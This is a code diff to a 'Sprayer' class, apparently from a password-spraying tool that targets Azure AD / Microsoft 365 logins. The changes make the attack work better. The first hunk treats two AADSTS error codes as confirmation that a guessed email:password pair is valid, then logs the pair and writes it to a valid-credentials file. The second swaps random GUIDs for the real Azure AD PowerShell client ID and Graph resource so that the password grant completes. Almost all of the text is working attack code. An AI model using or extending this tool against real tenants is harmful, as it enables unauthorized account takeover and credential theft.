@@ -188,13 +188,26 @@ class Sprayer(BaseHandler):
                 # Keep track of locked accounts seen
                 self.lockout += 0  # 1
 
-            err = Defaults.AADSTS_CODES[code][0]
-            msg = Defaults.AADSTS_CODES[code][1]
-            logging.info(
-                f"[{text_colors.red}{err}{text_colors.reset}] "
-                f"{email}:{password} "
-                f"({msg}.)"
-            )
+            # These error codes occur via oAuth2 only after a valid
+            # authentication has been processed
+            if code in ["AADSTS500011", "AADSTS700016"]:
+                tested = f"{email}:{password}"
+                if self.writer:
+                    self.valid_writer.write(tested)
+                self.VALID_CREDENTIALS.append(tested)
+                logging.info(
+                    f"[{text_colors.green}VALID{text_colors.reset}] {email}:{password}"
+                )
+
+            else:
+                err = Defaults.AADSTS_CODES[code][0]
+                msg = Defaults.AADSTS_CODES[code][1]
+                logging.info(
+                    f"[{text_colors.red}{err}{text_colors.reset}] "
+                    f"{email}:{password} "
+                    f"({msg}.)"
+                )
+
             # Remove errored user from being sprayed again
             self.userlist.remove(user)
 
@@ -429,10 +442,12 @@ class Sprayer(BaseHandler):
 
             time.sleep(0.250)
 
-            randomGuid = uuid4()
+            # Resource and client_id must be valid for authentication
+            # to complete
+            # APP: Azure Active Directory PowerShell
             data = {
-                "resource": randomGuid,
-                "client_id": randomGuid,
+                "resource": "https://graph.windows.net",
+                "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
                 "grant_type": "password",
                 "username": email,
                 "password": password,
